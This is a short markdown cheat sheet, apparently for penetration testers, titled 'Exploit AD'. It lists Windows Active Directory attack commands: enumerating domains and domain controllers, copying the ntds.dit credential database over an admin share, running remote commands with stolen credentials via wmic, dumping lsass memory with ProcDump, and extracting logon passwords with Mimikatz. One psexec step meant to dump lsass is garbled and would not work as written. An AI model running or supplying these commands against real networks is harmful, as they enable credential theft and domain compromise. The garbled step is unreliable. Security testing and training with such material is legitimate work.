<H1>Exploit AD</H1>

**Summery:** 

- [Network information gathering](#network-information-gathering)
  - [Active Directory](#active-directory)
  - [Get domain name](#get-domain-name)
  - [Command](#command)
    - [Remote](#remote)
  - [DC list](#dc-list)
  - [Dump password](#dump-password)
    - [Recover password (Attacker machine)](#recover-password-attacker-machine)


# Network information gathering 
## Active Directory 
Batch

    netdom /query dc

Powershell 

    Get-ADDomainController

fsmo roles

    Get-ADDomain | Select-Object InfrastructureMaster, RIDMaster, PDCEmulator
    Get-ADForest | Select-Object DomainNamingMaster, SchemaMaster
    Get-ADDomainController -Filter * |
    Select-Object Name, Domain, Forest, OperationMasterRoles |
    Where-Object {$_.OperationMasterRoles} |
    Format-Table -AutoSize

## Get domain name 

    wmic computersystem get domain
    or
    gpresult /R

## Command  

    net user \<DOMAIN>

    dir \\<IP_ADDRESSS>\sysvol

    copy \\<IP_ADDRESSS>\c$\temp\ntds.dit C:\temp


### Remote

Remote command  

    wmic /node:dc /user:<DOMAIN>\<USERNAME> /password:<PASSWORD> process call create "cmd /c systeminfo"

    runas.exe /netonly /user:<DOMAIN>\<USERNAME> cmd.exe

## DC list 
    nltest /dclist:pentest.lab

## Dump password
> Procdump
    Procdump.exe -accepteula -ma lsass.exe  

> Psexec

FileURL: https://live.sysinternals.com/psexec.exe

> Dump lsass
> 
    psexec.exe -i -s lsass.exe

### Recover password (Attacker machine)

Mimikatz.exe

        Mimikatz "sekurlsa::minidump lsass.dmp"
        sekurlsa::LogonPasswords